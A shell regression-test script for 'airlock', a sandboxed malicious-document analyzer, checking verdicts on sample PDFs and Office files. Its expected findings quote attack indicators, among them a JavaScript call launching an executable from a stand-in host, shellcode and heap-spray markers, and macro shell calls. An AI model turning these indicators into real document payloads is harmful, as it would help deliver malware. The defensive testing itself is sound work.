#!/bin/sh
# Regression suite: every sample must get exactly its expected verdict, and
# key findings must be present. Test files come from tests/fetch-fixtures.sh
# (generated PDFs + benign oletools fixtures); nothing personal is needed.
set -u
cd "$(dirname "$0")/.."
AIRLOCK=./host/target/release/airlock
OUT=build/tests
rm -rf "$OUT" && mkdir -p "$OUT"
fail=0

# Unit tests + randomised hostile-input tests of every host-side parser
# (AIRLOCK_FUZZ_ITERS raises the count for a long run).
for crate in proto host; do
    if (cd $crate && cargo test --release -q) >"$OUT/unit-$crate.log" 2>&1; then
        echo "ok   unit + fuzz tests ($crate: $(grep -o '[0-9]* passed' "$OUT/unit-$crate.log" | awk '{n+=$1} END {print n}') passed)"
    else
        echo "FAIL unit + fuzz tests ($crate, see $OUT/unit-$crate.log)"; fail=$((fail+1))
    fi
done

check() { # file, expected verdict, [required substring... | @norender]
    f=$1; want=$2; shift 2
    render=1
    name=$(basename "$f")
    if ! $AIRLOCK analyze "$f" --out "$OUT/$name" >"$OUT/$name.log" 2>&1; then
        echo "FAIL $name: airlock exited non-zero (see $OUT/$name.log)"; fail=$((fail+1)); return
    fi
    got=$(python3 -I -c 'import json,sys; print(json.load(open(sys.argv[1]))["verdict"])' "$OUT/$name/report.json")
    if [ "$got" != "$want" ]; then
        echo "FAIL $name: verdict '$got', expected '$want'"; fail=$((fail+1)); return
    fi
    for need in "$@"; do
        # Nothing visible to render (e.g. an Excel add-in is code only).
        [ "$need" = @norender ] && { render=0; continue; }
        if ! grep -qF -- "$need" "$OUT/$name/report.json"; then
            echo "FAIL $name: missing finding '$need'"; fail=$((fail+1)); return
        fi
    done
    [ $render = 0 ] || [ -f "$OUT/$name/safe.pdf" ] || { echo "FAIL $name: no safe.pdf"; fail=$((fail+1)); return; }
    echo "ok   $name -> $got"
}

NONE="NO ACTIVE BEHAVIOUR OBSERVED"
check testdata/clean.pdf "$NONE"
check testdata/text.pdf "$NONE"
check testdata/evil.pdf "MALICIOUS BEHAVIOUR" "app.launchURL(http://evil-cdn.example/p.exe)" "hex-escaped names"
check testdata/evil2.pdf "MALICIOUS BEHAVIOUR" "CVE-2008-2992" "shellcode pattern" "heap spray" "nLaunch=2" "gate.php"
check testdata/office/harmless-clean.docx "$NONE"
check testdata/office/harmless-clean.doc "$NONE"
check testdata/office/follina-template.docx "LIKELY MALICIOUS" "CVE-2022-30190" "remote template injection"
check testdata/office/dde-test.docx "LIKELY MALICIOUS" "DDE field runs a command"
check testdata/office/excel4_sample_macro.xls "SUSPICIOUS" "Excel 4.0 (XLM)"
check testdata/office/embedded-simple-2007.docx "SUSPICIOUS" "oleObject1.bin"
check testdata/office/sample_with_external_link_to_doc.docx "SUSPICIOUS" "externally linked OLE object"
check testdata/office/sample_with_vba.ppt "SUSPICIOUS" "Action_Click"
# Atomic Red Team: real techniques, harmless payloads.
check testdata/atomic/T1027-T1027-cc-macro.xlsm "SUSPICIOUS" "macro hides strings"
check testdata/atomic/T1137.006-ExcelVBAaddin.xlam "LIKELY MALICIOUS" "Auto_Open" "Wscript.Shell" @norender
check testdata/atomic/T1204.002-mirrorblast_emulation.xlsm "LIKELY MALICIOUS" "Auto_Open" "ScriptControl"
check testdata/atomic/T1218-T1218Test.docx "$NONE"
check testdata/atomic/T1221-Calculator.docx "LIKELY MALICIOUS" "remote template injection"
check testdata/atomic/T1221-opencalc.dotm "LIKELY MALICIOUS" "Document_open" "Shell"
check testdata/atomic/T1559.002-DDE_Document.docx "LIKELY MALICIOUS" "DDE field runs a command"
check testdata/atomic/T1566.001-PhishingAttachment.xlsm "LIKELY MALICIOUS" "Workbook_Open" "ShellExecute"

if $AIRLOCK view testdata/office/harmless-clean.docx --out "$OUT/view-docx" >"$OUT/view-docx.log" 2>&1 && [ -f "$OUT/view-docx/safe.pdf" ]; then
    echo "ok   view mode (docx, no network)"
else
    echo "FAIL view mode docx"; fail=$((fail+1))
fi
for f in testdata/text.pdf testdata/office/harmless-clean.docx; do
    if $AIRLOCK livecheck "$f" >"$OUT/live-$(basename "$f").log" 2>&1 && grep -q "hit(s)" "$OUT/live-$(basename "$f").log"; then
        echo "ok   live mode $(basename "$f") ($(grep -o 'ready in [0-9.]*s' "$OUT/live-$(basename "$f").log"))"
    else
        echo "FAIL live mode $(basename "$f")"; fail=$((fail+1))
    fi
done
# Rootless jail: where the machine supports it, Firecracker must not run as us.
if $AIRLOCK doctor 2>&1 | grep -q "ok    VMs run as a spare uid"; then
    $AIRLOCK livecheck testdata/text.pdf >/dev/null 2>&1 &
    lc=$!
    uids=""
    while kill -0 $lc 2>/dev/null; do
        # Firecracker runs from an inherited fd, so match its arguments, not its name.
        uids="$uids $(ps -eo uid=,args= | awk '/--config-file \/vm\/vm.json/ && !/awk/ {print $1}')"
        sleep 0.05
    done
    seen=$(echo $uids | tr ' ' '\n' | grep . | sort -u | tr '\n' ' ')
    if [ -n "$seen" ] && ! echo " $seen" | grep -qw "$(id -u)"; then
        echo "ok   VMs run as a spare uid ($seen)"
    else
        echo "FAIL VMs run as a spare uid (saw: ${seen:-no VM})"; fail=$((fail+1))
    fi
else
    echo "skip VMs run as a spare uid (not supported here; see airlock doctor)"
fi
if $AIRLOCK selftest --out "$OUT/selftest" >"$OUT/selftest.log" 2>&1; then
    echo "ok   selftest ($(grep -c PASS "$OUT/selftest.log") detectors)"
else
    echo "FAIL selftest (see $OUT/selftest.log)"; fail=$((fail+1))
fi

[ $fail -eq 0 ] && echo "ALL PASSED" || { echo "$fail FAILED"; exit 1; }
